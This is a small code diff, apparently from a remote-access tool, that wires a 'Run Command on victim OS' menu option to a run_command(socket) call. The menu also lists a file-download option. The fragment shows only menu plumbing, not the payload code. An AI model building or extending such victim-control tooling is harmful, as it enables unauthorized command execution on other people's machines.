@@ -1,4 +1,5 @@
 from core.connection.conn import *
+from core.features.command import *
 
 def show_options():
     print("[ 01 ] Run Command on victim OS")
@@ -18,6 +19,7 @@ def select_option(socket):
     send_2_client(socket, user_input)
     if user_input == "1":
         print("[+] Running Command")
+        run_command(socket)
     elif user_input == "2":
         print("[+] Downloading File")
     elif user_input == "99":
